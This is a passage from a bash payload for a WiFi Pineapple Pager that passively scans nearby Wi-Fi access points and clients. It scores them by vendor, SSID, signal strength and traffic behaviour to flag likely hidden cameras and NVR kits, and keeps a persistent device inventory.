  if [ "$b" != '?' ]; then POSTURE[$bssid]="$b"; POSTURE_TS[$bssid]=$now; POSTURE_RSN_C[$bssid]="$POSTURE_RSN"; POSTURE_EXT_C[$bssid]="$POSTURE_EXT"; fi   # a failed read is not cached
  POSTURE_LAST="$b"; printf '%s' "$b"
}
# --- response posture end ---

cleanup() {
  [ "$(cat "$LOCK_FILE" 2>/dev/null)" = "$$" ] || return 0
  trap - EXIT INT TERM
  kill_children
  if [ "$WATCH_LOCKED" = 1 ]; then _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; fi
  [ -n "$RUN_ID" ] && [ "$REPORT_DONE_AT_EXIT" != 1 ] && write_report quiet
  command -v bands_restore >/dev/null 2>&1 && bands_restore         # user payload only; the hooks never change bands
  rm -f "$LOCK_FILE" "$CHILD_FILE" "$CHILD_FILE.n" /tmp/cs_up_?.pcap /tmp/cs_dn_?.pcap /tmp/cs_ot_?.pcap "/tmp/cs_mem_$$.pcap" "/tmp/cs_asc_$$.pcap" "/tmp/cs_bcn_$$.pcap" "$FIRE_ERR" /tmp/cs_*.err /tmp/cs_signal "$LOOT_DIR/inventory.tsv.new" /tmp/cs_rows.tmp
  log run "exit cycles=$CYCLE"
  ui_ok && set_state FINISH
}
kill_children() {   # by stored PID only, never by pattern
  local p
  [ -f "$CHILD_FILE" ] || return 0
  while read -r p; do [ -n "$p" ] && kill -TERM "$p" 2>/dev/null; done <"$CHILD_FILE"
  sleep 0.3
  while read -r p; do [ -n "$p" ] && kill -KILL "$p" 2>/dev/null; done <"$CHILD_FILE"
  : >"$CHILD_FILE"
}
child_add() { printf '%s\n' "$1" >>"$CHILD_FILE"; }
# The `|| :` is load-bearing. grep exits 1 when it selects NO lines, which is exactly what
# happens when the pid being removed is the file's only line -- so the old `&& mv` never ran, the
# pid stayed registered for the rest of the run, and kill_children later SIGTERMed then SIGKILLed a
# pid the kernel may have recycled onto an unrelated process. On this device the neighbours are
# pineapd, the Go UI and tcpdump. The function's own comment says "by stored PID only, never by
# pattern"; its bookkeeping was defeating that. Found by the 2026-11-10 audit; predates it
# (758dfd7). It also left $CHILD_FILE.n behind every time, which cleanup now removes.
child_del() {
  [ -f "$CHILD_FILE" ] || return 0
  { grep -v -x "$1" "$CHILD_FILE" >"$CHILD_FILE.n" 2>/dev/null || :; }
  mv "$CHILD_FILE.n" "$CHILD_FILE" 2>/dev/null
}

# ============================================================================ scan state ===
declare -A ROLE SSID_CLEAN AP_OF CH FREQ BAND HIDDEN PROBES PREV_PKT PREV_T RATE BUSY_N BUSY
declare -A RSSI_LAST RSSI_HIST RSSI_BEST RSSI_BEST_TS LAST_SEEN FIRST_SEEN N_SEEN
declare -A ID_PTS ID_CLASSES ID_LABEL VEND_TYPE VEND_LABEL VEND_CAT
declare -A SSIDSIG                                   # ssid -> "pts|label|cat|type"
declare -A BEH BEH_GATE BEH_VERDICT CONF BANDNAME TAGS CAT LANE PROX KITAP KITCL
declare -A ALERTED_BAND ALERT_TS OFFERED IGNORED CLIENTS_OF EVENT_FLAG LAT LON RUNS_N
declare -a SEEN_THIS_CYCLE NEW_LIKELY NEW_CONFIRMED NEW_LANE
NEAR_DBM=-60; FAR_DBM=-75; ALERT_FAR=1
BATT="?"; BATT_TS=0; GPS_LAST="no fix"; GPS_BAD=0; LAST_LOCK_TS=0; RECON_EMPTY=0

apply_mode() {
  if [ "$MODE" = "SITE" ]; then NEAR_DBM=-70; FAR_DBM=-85; ALERT_FAR=0
  else MODE="ROOM"; NEAR_DBM=-60; FAR_DBM=-75; ALERT_FAR=1; fi
  log mode "mode -> $MODE"
}

# jq programs: one line per object, | separated, text fields sanitised in jq
JQ_APS='.[] | ([.beacon[]?, .response[]?]) as $e
 | (($e | map(.signal // -100) | max) // "-") as $sig
 | (($e | sort_by(.signal // -100) | last) // {}) as $best
 | (($e | map(select(((.ssid // "") | length) > 0)) | .[0].ssid) // "") as $ssid
 | ([.beacon[]? | .hidden] | any(. == 1 or . == true)) as $hid
 | (($e | map(.time // 0) | max) // 0) as $t
 | [.mac, (.packets // 0), ($ssid | tostring | reduce ("|",";","\n","\r","\t") as $c (.; split($c) | join("_")) | .[0:32]), ($best.channel // 0), ($best.freq // 0), $sig, (if $hid then 1 else 0 end), $t]
 | map(tostring) | join("|")'
# Client objects (2.0.0 `_pineap HELP PARSE`, read in CLAUDE.md s"2.0.0-stable, analysed"; the verb does not exist
# on 1.1.3): mac, time, signal, freq, packets, and a "probe" OBJECT keyed by an opaque SSID hash whose values carry
# the ssid -- so the probed SSIDs are the object's values, not an array. No documented key carries the association;
# ap_mac/bssid are read when present (the harness fixture's stand-in) and "-" otherwise, until the day-one spike
# finds a source (the Go UI's own recon API carries ap_mac; _pineap does not).
JQ_CLI_ROW='([ (.probe // {})[]? | if type == "object" then ((.ssid // "") | select(length > 0)) else tostring end ]) as $p
 | [.mac, (.ap_mac // .bssid // "-"), (.packets // 0), (.signal // .rssi // "-"),
    ($p | map(tostring | reduce ("|",";",",","\n","\r","\t") as $c (.; split($c) | join("_"))) | join(",")),
    (.freq // 0), (.time // .last_seen // 0), (.channel // 0)]
 | map(tostring) | join("|")'
JQ_CLI='.[] | '"$JQ_CLI_ROW"
# jq_works: jq must not merely EXIST, it must run the programs we actually use.
# Measured on the operator's 1.1.3 Pager, 2026-11-04: jq was present, so HAVE_JQ was 1, and both
# JQ_APS and JQ_CLI_ROW produced NOTHING -- a jq without Oniguruma has no gsub, so the programs
# failed at compile time, wrote their error to stderr, and emitted no rows. The regex fallbacks that
# would have worked were never reached, because they are gated on HAVE_JQ. CamHound reported an empty
# airspace and offered "Recon list empty. Start a Recon session?" -- the right message for the wrong
# reason, and no gate here could see it: this container's jq is 1.7 with regex support.
# The gsub uses are gone now, but the probe stays: it tests whatever the programs currently need,
# so the next unavailable builtin degrades to the fallback instead of to silence.
jq_works() {
  command -v jq >/dev/null 2>&1 || return 1
  [ "$(printf '%s' '[{"mac":"aa","probe":{"1":{"ssid":"c,d"}}}]' | jq -r "$JQ_CLI" 2>/dev/null)" \
    = 'aa|-|0|-|c_d|0|0|0' ] || return 1
  # JQ_APS too. It needs sort_by, max, last, any and a string slice that JQ_CLI never touches, so a
  # jq could pass the client probe above and still emit no AP rows: the gsub failure again, one
  # program over. Two beacon entries and a response, so the best-signal pick and the empty-SSID
  # skip both run. The expected row is what the program printed for this fixture, not a reading of it.
  [ "$(printf '%s' '[{"mac":"cc","packets":9,"beacon":{"1":{"ssid":"","signal":-70,"channel":1,"freq":2412,"hidden":false,"time":3},"2":{"ssid":"Net;A","signal":-40,"channel":11,"freq":2462,"hidden":false,"time":9}},"response":{"3":{"ssid":"Net;A","signal":-45,"channel":11,"freq":2462,"time":8}}}]' | jq -r "$JQ_APS" 2>/dev/null)" \
    = 'cc|9|Net_A|11|2462|-40|0|9' ] || return 1
  return 0
}
# 1.1.3 has no RECON CLIENTS verb (measured 2026-11-03: "Unknown recon command", rc 255) but RECON DEVICES lists every
# device in the same object shape, so a client there is a device that neither beacons nor answers probes.
JQ_DEVCLI='.[] | select(((.beacon // {}) | length) == 0 and ((.response // {}) | length) == 0) | '"$JQ_CLI_ROW"

# fallback parser (no jq): split the JSON on "},{" and read fields with bash regex. Reduced fidelity.
parse_aps_fallback() {   # stdin: JSON -> stdout: mac|packets|ssid|ch|freq|signal|hidden|time
  local json frag mac="" pk=0 ssid="" ch=0 fr=0 sig="-" hid=0 t=0 s
  json=$(cat); json=${json//\},\{/$'\n'}
  while IFS= read -r frag; do
    if [[ $frag =~ \"mac\":\"([^\"]+)\" ]]; then
      [ -n "$mac" ] && printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "$pk" "$ssid" "$ch" "$fr" "$sig" "$hid" "$t"
      mac=${BASH_REMATCH[1]}; pk=0; ssid=""; ch=0; fr=0; sig="-"; hid=0; t=0
      [[ $frag =~ \"packets\":([0-9]+) ]] && pk=${BASH_REMATCH[1]}
    fi
    [ -z "$mac" ] && continue
    if [[ $frag =~ \"ssid\":\"([^\"]*)\" ]]; then s=${BASH_REMATCH[1]}; [ -z "$ssid" ] && [ -n "$s" ] && { s=${s//[|;]/_}; ssid=${s:0:32}; }; fi
    if [[ $frag =~ \"signal\":(-?[0-9]+) ]]; then s=${BASH_REMATCH[1]}; if [ "$sig" = "-" ] || (( s > sig )); then sig=$s; [[ $frag =~ \"channel\":([0-9]+) ]] && ch=${BASH_REMATCH[1]}; [[ $frag =~ \"freq\":([0-9]+) ]] && fr=${BASH_REMATCH[1]}; fi; fi
    [[ $frag =~ \"hidden\":(1|true) ]] && hid=1
    if [[ $frag =~ \"time\":([0-9]+) ]]; then s=${BASH_REMATCH[1]}; (( s > t )) && t=$s; fi
  done <<<"$json"
  [ -n "$mac" ] && printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "$pk" "$ssid" "$ch" "$fr" "$sig" "$hid" "$t"
}
parse_cli_fallback() {   # stdout: mac|ap_mac|packets|signal|probes|freq|time|channel  (same shape rules as JQ_CLI above)
  local json frag top rest mac ap pk sig fr t ch probes p
  json=$(cat); json=${json//\},\{/$'\n'}
  while IFS= read -r frag; do
    [[ $frag =~ \"mac\":\"([^\"]+)\" ]] || continue
    [[ $frag == *\"beacon\":\{\"* || $frag == *\"response\":\{\"* ]] && continue   # an AP: a NON-EMPTY beacon/response object, as jq's length test
    # limit, accepted: a probed SSID containing { } or an escaped quote defeats the brace strip below (the jq path is exact)
    mac=${BASH_REMATCH[1]}; ap="-"; pk=0; sig="-"; fr=0; t=0; ch=0; probes=""
    # the device's own fields sit beside its probe object (keys are alphabetical on the device: freq, mac, packets,
    # probe, signal, time), and the probe values repeat time/signal/freq/channel -- so strip every nested {...}
    # group, innermost first, and read the top-level fields from what is left
    top=$frag; while [[ $top =~ (.*:)\{[^{}]*\}(.*) ]]; do top="${BASH_REMATCH[1]}${BASH_REMATCH[2]}"; done   # only groups that are a key's value: the object's own braces stay
    [[ $top =~ \"(ap_mac|bssid)\":\"([^\"]*)\" ]] && ap=${BASH_REMATCH[2]}
    [[ $top =~ \"packets\":([0-9]+) ]] && pk=${BASH_REMATCH[1]}
    [[ $top =~ \"signal\":(-?[0-9]+) ]] && sig=${BASH_REMATCH[1]}
    [[ $top =~ \"freq\":([0-9]+) ]] && fr=${BASH_REMATCH[1]}
    [[ $top =~ \"time\":([0-9]+) ]] && t=${BASH_REMATCH[1]}
    [[ $top =~ \"channel\":([0-9]+) ]] && ch=${BASH_REMATCH[1]}
    rest=${frag#*\"probe\":}; [ "$rest" = "$frag" ] && rest=""   # every "ssid" inside the probe object is a probed SSID
    while [[ $rest =~ \"ssid\":\"([^\"]*)\"(.*) ]]; do p=${BASH_REMATCH[1]}; rest=${BASH_REMATCH[2]}; [ -n "$p" ] || continue; p=${p//[|;,]/_}; probes+="${probes:+,}$p"; done
    printf '%s|%s|%s|%s|%s|%s|%s|%s\n' "$mac" "${ap:--}" "$pk" "$sig" "$probes" "$fr" "$t" "$ch"
  done <<<"$json"
}
RECON_CLI_VERB=CLIENTS   # CLIENTS on 2.0.0; DEVICES on 1.1.3, where CLIENTS is "Unknown recon command" (recon_verb_probe)
recon_verb_probe() {   # one call at start: pick the client verb this firmware has. rc 255 = unknown verb; a timeout keeps CLIENTS
  timeout 15 _pineap RECON CLIENTS format=json >/dev/null 2>&1
  [ $? = 255 ] && RECON_CLI_VERB=DEVICES
  log recon "client verb: $RECON_CLI_VERB"
}
recon_lines() {   # recon_lines APS|CLIENTS -> lines on stdout
  local what="$1" prog verb
  if [ "$what" = APS ]; then prog="$JQ_APS"; verb=APS
  elif [ "$RECON_CLI_VERB" = DEVICES ]; then prog="$JQ_DEVCLI"; verb=DEVICES
  else prog="$JQ_CLI"; verb=CLIENTS; fi
  if [ "$HAVE_JQ" = 1 ]; then
    timeout 15 _pineap RECON "$verb" format=json 2>/dev/null | jq -r "$prog" 2>/dev/null
  elif [ "$what" = APS ]; then
    timeout 15 _pineap RECON APS format=json 2>/dev/null | parse_aps_fallback
  else
    timeout 15 _pineap RECON "$verb" format=json 2>/dev/null | parse_cli_fallback
  fi
}

# ================================================================================ scoring ===
# vendor_sig mac -> VEND_TYPE/VEND_LABEL/VEND_CAT (cached per MAC; OUI rows first, then vendor regex)
vendor_sig() {
  local mac="$1" hex lbl v
  [ -n "${VEND_TYPE[$mac]+x}" ] && return 0
  vendor_of "$mac"
  hex=${mac^^}; hex=${hex//:/}
  for lbl in "${hex:0:9}" "${hex:0:7}" "${hex:0:6}"; do
    if [ -n "${SIG_OUI_LABEL[$lbl]}" ]; then
      VEND_TYPE[$mac]="OUI"; VEND_LABEL[$mac]="${SIG_OUI_LABEL[$lbl]}"; VEND_CAT[$mac]="${SIG_OUI_CAT[$lbl]}"; return 0
    fi
  done
  v="${VLOW[$mac]}"
  if [ -n "$v" ] && [ "$v" != "-" ]; then
    for lbl in "${VENDOR_ORDER[@]}"; do
      if [[ $v =~ ${SIG_VENDOR_PAT[$lbl]} ]]; then
        VEND_TYPE[$mac]="${SIG_VENDOR_TYPE[$lbl]}"; VEND_LABEL[$mac]="$lbl"; VEND_CAT[$mac]="${SIG_VENDOR_CAT[$lbl]}"; return 0
      fi
    done
  fi
  VEND_TYPE[$mac]="NONE"; VEND_LABEL[$mac]=""; VEND_CAT[$mac]=""
}
# ssid_sig "ssid" -> SSIDSIG[ssid] = "pts|label|cat|type" ("0|||" when nothing matches)
ssid_sig() {
  local s="$1" lbl best_pts=0 best=""
  [ -z "$s" ] && return 0
  [ -n "${SSIDSIG[$s]+x}" ] && return 0
  for lbl in "${SSID_ORDER[@]}"; do
    if [[ $s =~ ${SIG_SSID_PAT[$lbl]} ]]; then
      if [ "${SIG_SSID_TYPE[$lbl]}" = SSID ]; then best="$W_SSID|$lbl|${SIG_SSID_CAT[$lbl]}|SSID"; break
      elif (( W_SSID_WEAK > best_pts )); then best_pts=$W_SSID_WEAK; best="$W_SSID_WEAK|$lbl|${SIG_SSID_CAT[$lbl]}|SSID_WEAK"; fi
    fi
  done
  SSIDSIG[$s]="${best:-0|||}"
}
# score_device mac -> ID_PTS/ID_CLASSES/CONF/BANDNAME/TAGS/CAT/LANE
score_device() {
  local mac="$1" I=0 cls="" tags="" cat="" label="" vt vl ssid sp sl sc
  local role="${ROLE[$mac]}"
  local oui_pts=0 ssid_pts=0 kit_pts=0 rand=0 endpoint=0 modonly=0 ncls=0 Ieff Bh Bheff conf gate_beh=0 ev=0 lane="" band
  shopt -s nocasematch
  vendor_sig "$mac"; vt="${VEND_TYPE[$mac]}"; vl="${VEND_LABEL[$mac]}"
  case "$vt" in
    OUI|VENDOR)      oui_pts=$W_OUI; tags+=" $vl"; cat="${VEND_CAT[$mac]}"; label="$vl" ;;
    VENDOR_WEAK)     oui_pts=$W_WEAK; tags+=" $vl"; cat="${VEND_CAT[$mac]}"; label="$vl" ;;
    VENDOR_MODULE)   modonly=1; I=$((I + W_MODULE)); cat="IOTMOD"; label="$vl" ;;
    VENDOR_ENDPOINT) endpoint=1; cat="ENDPOINT"; label="$vl" ;;
  esac
  ssid="${SSID_CLEAN[$mac]}"
  if [ -n "$ssid" ]; then
    ssid_sig "$ssid"; IFS='|' read -r sp sl sc _ <<<"${SSIDSIG[$ssid]}"
    if (( sp > 0 )); then ssid_pts=$sp; tags+=" $sl"; { [ -z "$cat" ] || (( sp > oui_pts )); } && cat="$sc"; [ -z "$label" ] && label="$sl"; fi
  fi
  [ "${KITAP[$mac]}" = 1 ] && { kit_pts=$W_KIT; tags+=" KIT-AP"; cat="NVRKIT"; }
  I=$((I + oui_pts + ssid_pts + kit_pts))
  (( oui_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" OUI"; }
  (( ssid_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" SSID"; }
  (( kit_pts > 0 )) && { ncls=$((ncls + 1)); cls+=" KIT"; }
  if [ "$role" != cli ] && [ "${HIDDEN[$mac]}" = 1 ] && { [ "$vt" = OUI ] || [ "$vt" = VENDOR ] || [ "$vt" = VENDOR_WEAK ]; }; then I=$((I + W_HIDDEN)); tags+=" HIDDEN"; fi
  if [ "$role" = cli ] && is_rand "$mac"; then rand=1; I=$((I + W_RAND)); tags+=" RAND"; fi
  [ "${KITCL[$mac]}" = 1 ] && tags+=" KIT-CL"
  [ "${KITAP[$mac]}" = "?" ] && { I=$((I + W_KIT_WEAK)); tags+=" KIT?"; }
  (( modonly )) && tags+=" MODULE"
  (( endpoint )) && I=$((I + W_ENDPOINT))
  if [ "$role" = cli ] && (( rand == 0 )) && [ -n "${PROBES[$mac]}" ]; then
    local p pr; IFS=',' read -ra pr <<<"${PROBES[$mac]}"
    for p in "${pr[@]}"; do [ -z "$p" ] && continue; ssid_sig "$p"; [ "${SSIDSIG[$p]%%|*}" != 0 ] && { I=$((I + W_PROBE)); tags+=" PROBE"; break; }; done
  fi
  [ "${BUSY[$mac]}" = 1 ] && tags+=" BUSY"
  [ -n "${SEEN_LAST[$mac]}" ] && tags+=" SEEN"
  # behaviour axis
  Bh=${BEH[$mac]:-0}; gate_beh=${BEH_GATE[$mac]:-0}; ev=${EVENT_FLAG[$mac]:-0}
  [ "${BUSY[$mac]}" = 1 ] && Bh=$((Bh + W_BUSY))
  [ -n "${BEH_VERDICT[$mac]}" ] && tags+=" ${BEH_VERDICT[$mac]}"
  (( Bh > 100 )) && Bh=100; (( Bh < -20 )) && Bh=-20
  (( I > 100 )) && I=100
  Ieff=$I; (( ncls == 1 && Ieff > 69 )) && Ieff=69
  local global_ok=0; (( rand == 0 && endpoint == 0 )) && global_ok=1
  if (( I >= 12 )); then Bheff=$Bh
  elif (( ev && global_ok )); then Bheff=$Bh
  else Bheff=$Bh; (( Bheff > 69 )) && Bheff=69; lane="STREAM"; fi
  (( I >= 45 && Bheff < 0 )) && Bheff=0
  conf=$((Ieff + Bheff)); (( conf > 100 )) && conf=100; (( conf < 0 )) && conf=0
  if [ "$lane" = STREAM ]; then
    (( conf > 69 )) && conf=69
  else
    local confirmed=0 likely=0
    (( ncls >= 2 && oui_pts + ssid_pts + kit_pts >= 80 )) && confirmed=1
    { (( oui_pts >= 45 )) || (( ssid_pts >= 45 )); } && (( gate_beh >= 25 )) && confirmed=1
    (( confirmed == 0 && conf > 79 )) && conf=79
    (( I >= 45 )) && likely=1
    (( Bh >= 55 && I >= 12 )) && likely=1
    (( ev && global_ok )) && likely=1
    (( Bh >= 70 && global_ok )) && likely=1
    (( likely == 0 && conf > 44 )) && conf=44
  fi
  (( rand && conf > 69 )) && conf=69
  (( endpoint && ev == 0 && conf > 79 )) && conf=79
  (( I <= 0 && Bh <= 0 )) && conf=0
  if [ "$lane" = STREAM ] && (( conf >= 20 )); then band=STREAM
  elif (( conf >= 80 )); then band=CONFIRMED; elif (( conf >= 45 )); then band=LIKELY
  elif (( conf >= 20 )); then band=POSSIBLE
  elif (( modonly )); then band=MODULE; else band=none; fi
  [ -z "$cat" ] && cat="UNKNOWN"
  (( modonly )) && [ "$cat" = IOTMOD ] && (( conf < 20 )) && cat="IOTMOD"
  ID_PTS[$mac]=$I; ID_CLASSES[$mac]="${cls# }"; CONF[$mac]=$conf; BANDNAME[$mac]=$band
  TAGS[$mac]="${tags# }"; CAT[$mac]="$cat"; LANE[$mac]="$lane"; ID_LABEL[$mac]="$label"
  shopt -u nocasematch
}

# RSSI_MIN list gate on the best reading known for the MAC -- the inventory's carried-over best included
# (0 = off; a device with no reading passes). A kit AP also passes when any of its kit clients does: the
# clients are NOALERT, so hiding a weak NVR behind strong cameras would lose the kit's one alert.
rssi_gate_ok() {
  (( RSSI_MIN == 0 )) && return 0
  rssi_gate_own "$1" && return 0
  [ "${KITAP[$1]}" = 1 ] || return 1
  local c; for c in ${CLIENTS_OF[$1]}; do [ "${KITCL[$c]}" = 1 ] && rssi_gate_own "$c" && return 0; done
  return 1
}
rssi_gate_own() { [[ ${RSSI_BEST[$1]:-x} =~ ^-?[0-9]+$ ]] || return 0; (( ${RSSI_BEST[$1]} >= RSSI_MIN )); }
# proximity bucket from the best RSSI over the last 3 cycles; UNK fails open
prox_of() {
  local mac="$1" best=-999 r near=$NEAR_DBM far=$FAR_DBM
  for r in ${RSSI_HIST[$mac]}; do [ "$r" = "-" ] && continue; (( r > best )) && best=$r; done
  if (( best == -999 )) || (( EPOCHSECONDS - ${LAST_SEEN[$mac]:-0} > 90 )); then PROX[$mac]="?"; return; fi
  [ "${BAND[$mac]}" = 5 ] || [ "${BAND[$mac]}" = 6 ] && { near=$((near - 7)); far=$((far - 7)); }
  [ "${ROLE[$mac]}" = cli ] && { near=$((near - 6)); far=$((far - 6)); }
  if (( best >= near )); then PROX[$mac]="N"; elif (( best < far )); then PROX[$mac]="F"; else PROX[$mac]="M"; fi
}

# record_seen mac role ssid ch freq signal time  (shared by AP and client rows)
record_seen() {
  local mac="$1" role="$2" ssid="$3" ch="$4" fr="$5" sig="$6" h
  if [ -z "${ROLE[$mac]}" ]; then
    ROLE[$mac]="$role"; FIRST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=0; RSSI_HIST[$mac]=""; FIRST_CYCLE[$mac]=$CYCLE
    if [ -n "${SEEN_FIRST[$mac]}" ]; then   # known from an earlier run: carry the cumulative evidence over
      FIRST_SEEN[$mac]=${SEEN_FIRST[$mac]}; N_SEEN[$mac]=${SEEN_N[$mac]:-0}; RETURNING=$((RETURNING + 1))
      if [[ ${SEEN_RSSI[$mac]} =~ ^-?[0-9]+$ ]]; then RSSI_BEST[$mac]=${SEEN_RSSI[$mac]}; RSSI_BEST_TS[$mac]=${SEEN_RSSI_TS[$mac]:-${SEEN_LAST[$mac]}}; fi
      [ "${SEEN_LAT[$mac]:--}" != - ] && LAT[$mac]=${SEEN_LAT[$mac]} && LON[$mac]=${SEEN_LON[$mac]}
      if [[ ${SEEN_BEH[$mac]} =~ ^-?[0-9]+$ ]] && (( SEEN_BEH[$mac] != 0 )); then
        BEH[$mac]=${SEEN_BEH[$mac]}; BEH_VERDICT[$mac]=${SEEN_VERDICT[$mac]}
        case "${SEEN_VERDICT[$mac]}" in STREAM|EVENT|EVENT?) BEH_GATE[$mac]=${SEEN_BEH[$mac]} ;; esac
        case "${SEEN_VERDICT[$mac]}" in EVENT|EVENT?) EVENT_FLAG[$mac]=1 ;; esac
      fi
    fi
    vendor_sig "$mac"
  elif [ "${ROLE[$mac]}" != "$role" ] && [ "${ROLE[$mac]}" != "ap+cli" ]; then ROLE[$mac]="ap+cli"; fi
  LAST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=$((${N_SEEN[$mac]} + 1)); SEEN_THIS_CYCLE+=("$mac")
  [ -n "$ssid" ] && SSID_CLEAN[$mac]="$ssid"
  [ "$ch" != 0 ] && CH[$mac]="$ch"
  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; band_of "$fr"; BAND[$mac]=$BAND_V; fi
  if [[ $sig =~ ^-?[0-9]+$ ]]; then
    RSSI_LAST[$mac]=$sig
    h="${RSSI_HIST[$mac]} $sig"; set -- $h; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
    if [ -z "${RSSI_BEST[$mac]}" ] || (( sig > ${RSSI_BEST[$mac]} )); then
      [ -n "${RSSI_BEST[$mac]}" ] && (( sig - ${RSSI_BEST[$mac]} >= 3 )) && RSSI_IMPROVED[$mac]=1
      [ -z "${RSSI_BEST[$mac]}" ] && RSSI_IMPROVED[$mac]=1
      RSSI_BEST[$mac]=$sig; RSSI_BEST_TS[$mac]=$EPOCHSECONDS
    fi
  else
    RSSI_HIST[$mac]="${RSSI_HIST[$mac]} -"; set -- ${RSSI_HIST[$mac]}; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
  fi
}
declare -A RSSI_IMPROVED FIRST_CYCLE
# packet-rate delta (clients): RATE x10 frames/s between polls
rate_update() {
  local mac="$1" pk="$2" now=$EPOCHSECONDS dt dp
  if [ -n "${PREV_PKT[$mac]}" ] && (( now - ${PREV_T[$mac]} <= 2 * CYCLE_SECS )) && (( LAST_LOCK_TS < ${PREV_T[$mac]} )); then
    dt=$((now - ${PREV_T[$mac]})); dp=$((pk - ${PREV_PKT[$mac]}))
    if (( dt > 0 && dp >= 0 )); then RATE[$mac]=$((dp * 10 / dt)); else RATE[$mac]=""; fi
  else RATE[$mac]=""; fi
  PREV_PKT[$mac]=$pk; PREV_T[$mac]=$now
}

# ---- shared helpers (also used by the recon hooks) ----
confirm() {   # confirm "question" -> 0 only when the operator confirmed
  local resp rc
  resp=$(CONFIRMATION_DIALOG "$1" 2>/dev/null); rc=$?
  (( rc != 0 )) && return 1
  if [ -n "${DUCKYSCRIPT_USER_CONFIRMED:-}" ]; then [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; else [[ ${resp,,} =~ ^(1|yes|y|true|confirmed)$ ]]; fi
}
count_band() { local m n=0; for m in "${!BANDNAME[@]}"; do [ "${BANDNAME[$m]}" = "$1" ] && n=$((n + 1)); done; printf '%s' "$n"; }
watchable() {
  local mac="$1"
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  if [ "${ROLE[$mac]}" = cli ]; then [ -n "${AP_OF[$mac]}" ] && [ "${AP_OF[$mac]}" != "-" ] || return 1; fi
  # User payload only (the hooks carry no such function and take AP and channel from the Recon UI):
  # an AP read off the air whose channel is not known yet gives the lock nothing to verify against.
  # lock_target treats a channel of 0 as "any channel is fine", so without this a Watch would park
  # wherever the radio happened to be, say nothing, and loot a row for channel 0.
  command -v assoc_nochan >/dev/null 2>&1 && assoc_nochan "$mac" && return 1
  return 0
}
is_setup_ap() { local s="${SSID_CLEAN[$1]}"; [ "${ROLE[$1]}" != cli ] && [ -n "$s" ] && [ "${SSIDSIG[$s]##*|}" = SSID ]; }
auto_offer_ok() { watchable "$1" && ! is_setup_ap "$1"; }
INV_HDR='#first_seen|last_seen|run_id|mac|role|cat|vendor|label|conf|id_score|beh_score|beh_verdict|band|ssid|ap_bssid|ch|freq|rssi_best|rssi_best_ts|rssi_last|prox|n_seen|pkt_rate|signals|lan_tag|lat|lon'
inv_row() {   # inv_row mac -> stdout one row
  local m="$1"
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
    "${FIRST_SEEN[$m]}" "${LAST_SEEN[$m]}" "$RUN_ID" "$m" "${ROLE[$m]}" "${CAT[$m]:-UNKNOWN}" "${VENDOR[$m]:--}" "${ID_LABEL[$m]:--}" \
    "${CONF[$m]:-0}" "${ID_PTS[$m]:-0}" "${BEH[$m]:-0}" "${BEH_VERDICT[$m]:--}" "${BAND[$m]:-?}" "${SSID_CLEAN[$m]:--}" "${AP_OF[$m]:--}" \
    "${CH[$m]:--}" "${FREQ[$m]:--}" "${RSSI_BEST[$m]:--}" "${RSSI_BEST_TS[$m]:--}" "${RSSI_LAST[$m]:--}" "${PROX[$m]:-?}" "${N_SEEN[$m]:-0}" \
    "${RATE[$m]:--}" "${TAGS[$m]:--}" "-" "${LAT[$m]:--}" "${LON[$m]:--}"
}
upsert_inventory() { (( ${#SCORED[@]} )) || return 0; upsert_rows "${!SCORED[@]}"; }
# ---- persistence across runs: inventory.tsv is the store ----
declare -A SEEN_LAST SEEN_CONF SEEN_RSSI SEEN_RSSI_TS SEEN_FIRST SEEN_N SEEN_LAT SEEN_LON SEEN_BEH SEEN_VERDICT
CLOCK_OK=1; RETURNING=0; LOADED_ROWS=0; DEDUPE_RUN=1
load_inventory() {   # read inventory.tsv once at start into SEEN_*; prune rows older than INVENTORY_KEEP_DAYS; clock guard
  local f="$LOOT_DIR/inventory.tsv" fs ls mac conf beh verdict rb rbts n lat lon maxls=0 cutoff=0
  [ -s "$f" ] || return 0
  (( INVENTORY_KEEP_DAYS > 0 )) && cutoff=$(( EPOCHSECONDS - INVENTORY_KEEP_DAYS * 86400 ))
  while IFS='|' read -r fs ls _ mac _ _ _ _ conf _ beh verdict _ _ _ _ _ rb rbts _ _ n _ _ _ lat lon; do
    [[ $fs =~ ^[0-9]+$ && $ls =~ ^[0-9]+$ ]] || continue
    (( ls > maxls )) && maxls=$ls
    SEEN_LAST[$mac]=$ls; SEEN_CONF[$mac]=${conf:-0}; SEEN_RSSI[$mac]=${rb:--}; SEEN_RSSI_TS[$mac]=${rbts:--}; SEEN_FIRST[$mac]=$fs; SEEN_N[$mac]=${n:-0}
    SEEN_LAT[$mac]=${lat:--}; SEEN_LON[$mac]=${lon:--}; SEEN_BEH[$mac]=${beh:-0}; SEEN_VERDICT[$mac]=${verdict:--}
    LOADED_ROWS=$((LOADED_ROWS + 1))
  done <"$f"
  if (( maxls > EPOCHSECONDS )); then
    CLOCK_OK=0; log warn "clock invalid: inventory newer than now; dedupe and prune disabled"; ui_ok && LOG yellow "clock invalid: dedupe off"; return 0
  fi
  if (( cutoff > 0 )); then
    awk -F'|' -v c="$cutoff" '/^#/ { print; next } $2 ~ /^[0-9]+$/ && $2 >= c { print }' "$f" >"$f.new" 2>/dev/null && mv "$f.new" "$f"
    for mac in "${!SEEN_LAST[@]}"; do (( ${SEEN_LAST[$mac]} < cutoff )) && unset "SEEN_LAST[$mac]" "SEEN_CONF[$mac]" "SEEN_RSSI[$mac]" "SEEN_RSSI_TS[$mac]" "SEEN_FIRST[$mac]" "SEEN_N[$mac]" "SEEN_LAT[$mac]" "SEEN_LON[$mac]" "SEEN_BEH[$mac]" "SEEN_VERDICT[$mac]"; done
  fi
  return 0
}
